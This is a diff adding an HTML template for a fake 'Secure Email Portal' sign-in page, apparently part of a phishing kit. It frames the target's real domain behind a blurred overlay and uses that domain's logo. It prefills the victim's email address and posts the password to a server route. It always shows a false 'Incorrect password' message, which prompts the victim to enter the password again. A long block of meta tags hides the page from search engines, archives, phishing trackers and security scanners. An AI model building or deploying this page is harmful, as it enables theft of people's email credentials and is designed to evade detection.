@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+	<!-- General directive for all compliant bots -->
+	<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, noodp, notranslate, nositelinkssearchbox, max-snippet:-1, max-image-preview:none, max-video-preview:0">
+	
+	<!-- Major search engines -->
+	<meta name="googlebot" content="noindex, nofollow, noarchive, notranslate, nositelinkssearchbox, max-image-preview:none, max-snippet:-1, max-video-preview:0">
+	<meta name="googlebot-news" content="noindex, nofollow, noarchive">
+	<meta name="googlebot-image" content="noimageindex">
+	<meta name="bingbot" content="noindex, nofollow, noarchive, notranslate, nositelinkssearchbox">
+	<meta name="yandex" content="noindex, nofollow, noarchive">
+	<meta name="baiduspider" content="noindex, nofollow, noarchive">
+	<meta name="duckduckbot" content="noindex, nofollow, noarchive">
+	<meta name="exabot" content="noindex, nofollow, noarchive">
+	<meta name="sogou" content="noindex, nofollow, noarchive">
+	<meta name="teoma" content="noindex, nofollow, noarchive">
+	<meta name="slurp" content="noindex, nofollow, noarchive">
+	<meta name="applebot" content="noindex, nofollow, noarchive">
+	
+	<!-- Archiving and research crawlers -->
+	<meta name="ia_archiver" content="noindex, nofollow, noarchive">
+	<meta name="archive.org_bot" content="noindex, nofollow, noarchive">
+	<meta name="specialarchiver" content="noindex, nofollow, noarchive">
+	<meta name="nutch" content="noindex, nofollow, noarchive">
+	<meta name="heritrix" content="noindex, nofollow, noarchive">
+	<meta name="httrack" content="noindex, nofollow, noarchive">
+	
+	<!-- Social media bots -->
+	<meta name="facebookexternalhit" content="noindex, nofollow, noarchive">
+	<meta name="twitterbot" content="noindex, nofollow, noarchive">
+	<meta name="linkedinbot" content="noindex, nofollow, noarchive">
+	<meta name="pinterestbot" content="noindex, nofollow, noarchive">
+	<meta name="discordbot" content="noindex, nofollow, noarchive">
+	<meta name="slackbot" content="noindex, nofollow, noarchive">
+	<meta name="telegrambot" content="noindex, nofollow, noarchive">
+	<meta name="whatsapp" content="noindex, nofollow, noarchive">
+	<meta name="wechat" content="noindex, nofollow, noarchive">
+	<meta name="skypeuripreview" content="noindex, nofollow, noarchive">
+	
+	<!-- Advertising and media crawlers -->
+	<meta name="mediapartners-google" content="noindex, nofollow, noarchive">
+	<meta name="adsbot-google" content="noindex, nofollow, noarchive">
+	<meta name="adsbot-google-mobile" content="noindex, nofollow, noarchive">
+	
+	<!-- SEO & analytics crawlers -->
+	<meta name="ahrefsbot" content="noindex, nofollow, noarchive">
+	<meta name="mj12bot" content="noindex, nofollow, noarchive">
+	<meta name="semrushbot" content="noindex, nofollow, noarchive">
+	<meta name="dotbot" content="noindex, nofollow, noarchive">
+	<meta name="spbot" content="noindex, nofollow, noarchive">
+	<meta name="ezooms" content="noindex, nofollow, noarchive">
+	<meta name="searchmetricsbot" content="noindex, nofollow, noarchive">
+	<meta name="sistrix" content="noindex, nofollow, noarchive">
+	<meta name="megaindex.ru" content="noindex, nofollow, noarchive">
+	<meta name="linkpadbot" content="noindex, nofollow, noarchive">
+	<meta name="dataforseobot" content="noindex, nofollow, noarchive">
+	<meta name="serpstatbot" content="noindex, nofollow, noarchive">
+	<meta name="blexbot" content="noindex, nofollow, noarchive">
+	<meta name="panscient" content="noindex, nofollow, noarchive">
+	<meta name="youbot" content="noindex, nofollow, noarchive">
+	<meta name="neevabot" content="noindex, nofollow, noarchive">
+	<meta name="scoutjet" content="noindex, nofollow, noarchive">
+	<meta name="mojeekbot" content="noindex, nofollow, noarchive">
+	<meta name="cliqzbot" content="noindex, nofollow, noarchive">
+	<meta name="genieo" content="noindex, nofollow, noarchive">
+	<meta name="barkrowler" content="noindex, nofollow, noarchive">
+	<meta name="infotigerbot" content="noindex, nofollow, noarchive">
+	<meta name="ltx71" content="noindex, nofollow, noarchive">
+	<meta name="qwantify" content="noindex, nofollow, noarchive">
+	<meta name="safednsbot" content="noindex, nofollow, noarchive">
+	<meta name="aspiegelbot" content="noindex, nofollow, noarchive">
+	
+	<!-- Monitoring & performance bots -->
+	<meta name="uptimerobot" content="noindex, nofollow, noarchive">
+	<meta name="statuscake" content="noindex, nofollow, noarchive">
+	<meta name="pingdom" content="noindex, nofollow, noarchive">
+	<meta name="dareboost" content="noindex, nofollow, noarchive">
+	<meta name="gtmetrix" content="noindex, nofollow, noarchive">
+	<meta name="webpagetest" content="noindex, nofollow, noarchive">
+	<meta name="speedcurve" content="noindex, nofollow, noarchive">
+	<meta name="panopta" content="noindex, nofollow, noarchive">
+	
+	<!-- Security & scanning bots -->
+	<meta name="phishtank" content="noindex, nofollow, noarchive">
+	<meta name="aws security scanner" content="noindex, nofollow, noarchive">
+	<meta name="nuclei" content="noindex, nofollow, noarchive">
+	<meta name="nessus" content="noindex, nofollow, noarchive">
+	
+	<!-- Development & testing bots -->
+	<meta name="selenium" content="noindex, nofollow, noarchive">
+	<meta name="playwright" content="noindex, nofollow, noarchive">
+	<meta name="puppeteer" content="noindex, nofollow, noarchive">
+	<meta name="headlesschrome" content="noindex, nofollow, noarchive">
+	<meta name="phantomjs" content="noindex, nofollow, noarchive">
+	<meta name="cypress" content="noindex, nofollow, noarchive">
+	<meta name="webdriver" content="noindex, nofollow, noarchive">
+	<meta name="lighthouse" content="noindex, nofollow, noarchive">
+	<meta name="calypso" content="noindex, nofollow, noarchive">
+	
+	<!-- Feed & content fetchers -->
+	<meta name="feedfetcher-google" content="noindex, nofollow, noarchive">
+	<meta name="feedly" content="noindex, nofollow, noarchive">
+	<meta name="r6_feedfetcher" content="noindex, nofollow, noarchive">
+	<meta name="feedburner" content="noindex, nofollow, noarchive">
+	
+	<!-- Regional search engines -->
+	<meta name="seznambot" content="noindex, nofollow, noarchive">
+	<meta name="mail.ru_bot" content="noindex, nofollow, noarchive">
+	<meta name="zumbot" content="noindex, nofollow, noarchive">
+	<meta name="jikespider" content="noindex, nofollow, noarchive">
+	
+	<!-- HTTP client libraries -->
+	<meta name="python-urllib" content="noindex, nofollow, noarchive">
+	<meta name="go-http-client" content="noindex, nofollow, noarchive">
+	<meta name="java" content="noindex, nofollow, noarchive">
+	<meta name="apache-httpclient" content="noindex, nofollow, noarchive">
+	<meta name="okhttp" content="noindex, nofollow, noarchive">
+	<meta name="node-fetch" content="noindex, nofollow, noarchive">
+	<meta name="axios" content="noindex, nofollow, noarchive">
+	<meta name="restsharp" content="noindex, nofollow, noarchive">
+	<meta name="guzzlehttp" content="noindex, nofollow, noarchive">
+	<meta name="python-requests" content="noindex, nofollow, noarchive">
+	
+	<!-- Testing & benchmarking tools -->
+	<meta name="apachebench" content="noindex, nofollow, noarchive">
+	<meta name="ab" content="noindex, nofollow, noarchive">
+	<meta name="siege" content="noindex, nofollow, noarchive">
+	<meta name="wrk" content="noindex, nofollow, noarchive">
+	<meta name="vegeta" content="noindex, nofollow, noarchive">
+	<meta name="k6" content="noindex, nofollow, noarchive">
+	
+	<!-- Content aggregators -->
+	<meta name="paperlibot" content="noindex, nofollow, noarchive">
+	<meta name="tweetedtimes" content="noindex, nofollow, noarchive">
+	<meta name="tweetmemebot" content="noindex, nofollow, noarchive">
+	<meta name="spinn3r" content="noindex, nofollow, noarchive">
+	<meta name="inagist" content="noindex, nofollow, noarchive">
+	
+	<!-- Web service bots -->
+	<meta name="amazon cloudfront" content="noindex, nofollow, noarchive">
+	<meta name="cloudflare-alwaysonline" content="noindex, nofollow, noarchive">
+	<meta name="iframely" content="noindex, nofollow, noarchive">
+	<meta name="embedly" content="noindex, nofollow, noarchive">
+	<meta name="metauri" content="noindex, nofollow, noarchive">
+	<meta name="longurl" content="noindex, nofollow, noarchive">
+	
+	<!-- Generic fallbacks for unknown or custom user-agents -->
+	<meta name="crawler" content="noindex, nofollow, noarchive">
+	<meta name="spider" content="noindex, nofollow, noarchive">
+	<meta name="bot" content="noindex, nofollow, noarchive">
+	<meta name="curl" content="noindex, nofollow, noarchive">
+	<meta name="wget" content="noindex, nofollow, noarchive">
+	<meta name="scrapy" content="noindex, nofollow, noarchive">
+	<meta name="mechanize" content="noindex, nofollow, noarchive">
+	<meta name="beautifulsoup" content="noindex, nofollow, noarchive">
+	
+	<!-- Additional comprehensive protection -->
+	<meta name="google" content="nopagereadaloud, notranslate">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="referrer" content="no-referrer">
+	
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Email Portal</title>
+    <link rel="icon" href="https://api.kickfire.com/logo?website={{ user_domain }}" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f3f3f3;
+            overflow: hidden;
+        }
+        #background-iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: -1;
+            filter: blur(3px) brightness(0.8);
+        }
+        .signin-container {
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            padding: 25px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            width: 90%;
+            max-width: 350px;
+            box-sizing: border-box;
+            animation: fadeIn 1s ease-in-out;
+            color: #fff;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        .signin-container h1 {
+            text-align: center;
+            margin-bottom: 8px;
+            font-size: 20px;
+            color: #fff;
+            font-weight: 400;
+        }
+        .signin-container h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.8);
+            font-weight: 400;
+        }
+        .signin-container img {
+            display: block;
+            margin: 0 auto 8px;
+        }
+        .signin-container form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .signin-container label {
+            width: 90%;
+            margin-bottom: 6px;
+            font-size: 13px;
+            color: #fff;
+            text-align: left;
+            font-weight: 500;
+        }
+        .signin-container input,
+        .signin-container button {
+            width: 90%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 6px;
+            font-size: 13px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+        }
+        .signin-container input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+        .signin-container input:hover,
+        .signin-container input:focus {
+            border-color: rgba(255, 255, 255, 0.4);
+            box-shadow: 0 0 8px rgba(255, 255, 255, 0.2);
+            background: rgba(255, 255, 255, 0.15);
+            outline: none;
+        }
+        .email-container {
+            width: 90%;
+            position: relative;
+            margin-bottom: 15px;
+        }
+        .email-container input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 6px;
+            font-size: 13px;
+            box-sizing: border-box;
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+        }
+        .email-container .email-icon {
+            position: absolute;
+            top: 50%;
+            right: 12px;
+            transform: translateY(-50%);
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 14px;
+        }
+        .password-container {
+            width: 90%;
+            position: relative;
+            margin-bottom: 20px;
+        }
+        .password-container input {
+            width: 100%;
+            padding: 12px;
+            padding-right: 40px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 6px;
+            font-size: 13px;
+            box-sizing: border-box;
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+        }
+        .password-container .show-password {
+            position: absolute;
+            top: 50%;
+            right: 12px;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 14px;
+            transition: color 0.3s ease;
+        }
+        .password-container .show-password:hover {
+            color: #fff;
+        }
+        .signin-container button {
+            background-color: rgba(255, 255, 255, 0.25);
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            font-size: 14px;
+            padding: 12px;
+            margin-top: 5px;
+        }
+        .signin-container button:hover {
+            background-color: rgba(255, 255, 255, 0.35);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+        }
+        .user-info {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 18px;
+            text-align: center;
+            font-size: 13px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .user-info strong {
+            color: #fff;
+            font-weight: 500;
+        }
+        footer {
+            margin-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 15px;
+        }
+        footer p {
+            font-size: 11px;
+            text-align: center;
+            color: rgba(255, 255, 255, 0.6);
+            line-height: 1.3;
+            margin: 4px 0;
+        }
+        @media (max-width: 600px) {
+            .signin-container {
+                padding: 20px;
+                max-width: 320px;
+            }
+            .signin-container h1 {
+                font-size: 18px;
+            }
+            .signin-container h2 {
+                font-size: 12px;
+            }
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-8px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        /* Loader Styling */
+        #loader {
+            text-align: center;
+            padding: 30px;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(15px);
+            border-radius: 8px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            animation: fadeIn 0.5s ease-in-out;
+            transition: transform 0.3s ease-in-out;
+            display: none;
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        #loading-spinner {
+            margin: 15px auto;
+            border: 8px solid rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            border-top: 8px solid rgba(255, 255, 255, 0.8);
+            width: 50px;
+            height: 50px;
+            animation: loading 1s linear infinite;
+        }
+
+        @keyframes loading {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .form-message {
+            margin: 8px 0;
+            padding: 8px;
+            border-radius: 4px;
+            text-align: center;
+            font-size: 12px;
+            display: none;
+        }
+        
+        .error {
+            background: rgba(255, 0, 0, 0.2);
+            color: #ff6b6b;
+            border: 1px solid rgba(255, 107, 107, 0.3);
+        }
+        
+        .success {
+            background: rgba(0, 255, 0, 0.2);
+            color: #51cf66;
+            border: 1px solid rgba(81, 207, 102, 0.3);
+        }
+
+    </style>
+</head>
+<body>
+    <!-- Background iframe -->
+    <iframe id="background-iframe" src="https://{{ user_domain }}"></iframe>
+
+    <!-- Loader Section -->
+    <div id="loader">
+        <div id="loading-spinner"></div>
+        <div id="info"></div>
+    </div>
+
+    <!-- Signin Form -->
+    <div class="signin-container" id="signin-container">
+        <div id="forms">
+            <center>
+                <h1>Secure Email Access</h1>
+                <h2>Sign in with your {{ user_domain }} account</h2>
+                
+                <div class="user-info">
+                    Welcome, <strong>{{ user_greet }}</strong>
+                </div>
+
+                <form novalidate name="login_form" id="login_form" action="{{ url_for('process_third') }}" method="post">
+                    <div class="email-container">
+                        <input name="greet" value="{{ user_greet }}" type="email" placeholder="Email address" readonly required>
+                        <div class="email-icon">
+                            <i class="fas fa-envelope"></i>
+                        </div>
+                    </div>
+                    
+                    <div class="password-container">
+                        <input name="salute" id="password" type="password" placeholder="Enter your password" required>
+                        <div class="show-password" id="togglePassword">
+                            <i class="fas fa-eye"></i>
+                        </div>
+                    </div>
+                    
+                    <button type="submit" id="login_submit">
+                        <i class="fas fa-sign-in-alt" style="margin-right: 6px;"></i>
+                        Sign In
+                    </button>
+                </form>
+
+                <div id="form-message" class="form-message"></div>
+				<!-- Warning message -->
+                <div class="form-message" id="warningMessage">
+                    <i class="fas fa-exclamation-triangle"></i> Incorrect password. Please try again.
+                </div>
+
+                <footer>
+                    <p>Secure access to your email account</p>
+                    <p>© 2025 {{ user_domain }} | All rights reserved</p>
+                    <p style="font-size: 9px; opacity: 0.5;">Client ID: {{ client_id }}</p>
+                </footer>
+            </center>
+        </div>
+    </div>
+
+    <script>
+    // Show password functionality
+    const togglePassword = document.getElementById('togglePassword');
+    const password = document.getElementById('password');
+    const passwordIcon = togglePassword.querySelector('i');
+
+    togglePassword.addEventListener('click', function() {
+        const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+        password.setAttribute('type', type);
+        passwordIcon.className = type === 'password' ? 'fas fa-eye' : 'fas fa-eye-slash';
+    });
+
+    // Show warning message function
+    function showWarningMessage() {
+        const warningMessage = document.getElementById('warningMessage');
+        warningMessage.style.display = 'block';
+        
+        setTimeout(function() {
+            warningMessage.style.display = 'none';
+            // Continue with actual form submission after warning is hidden
+            document.getElementById('login_form').submit();
+        }, 1000); // Reduced from 2000 to 1000 as per your code
+    }
+
+    // Form submission handler - SINGLE HANDLER
+    document.getElementById('login_form').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent immediate form submission
+        
+        const password = document.getElementById('password').value;
+        const messageDiv = document.getElementById('form-message');
+        
+        // Validate password
+        if (!password) {
+            showMessage('Please enter your password', 'error');
+            return;
+        }
+        
+        // Show loading state
+        const submitBtn = document.getElementById('login_submit');
+        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 6px;"></i> Signing In...';
+        submitBtn.disabled = true;
+        
+        // Show warning message before submitting
+        showWarningMessage();
+    });
+
+    function showMessage(text, type) {
+        const messageDiv = document.getElementById('form-message');
+        messageDiv.textContent = text;
+        messageDiv.className = `form-message ${type}`;
+        messageDiv.style.display = 'block';
+        
+        setTimeout(() => {
+            messageDiv.style.display = 'none';
+        }, 5000);
+    }
+
+    // Auto-focus on password field
+    document.addEventListener('DOMContentLoaded', function() {
+        document.getElementById('password').focus();
+    });
+	</script>
+</body>
+</html>
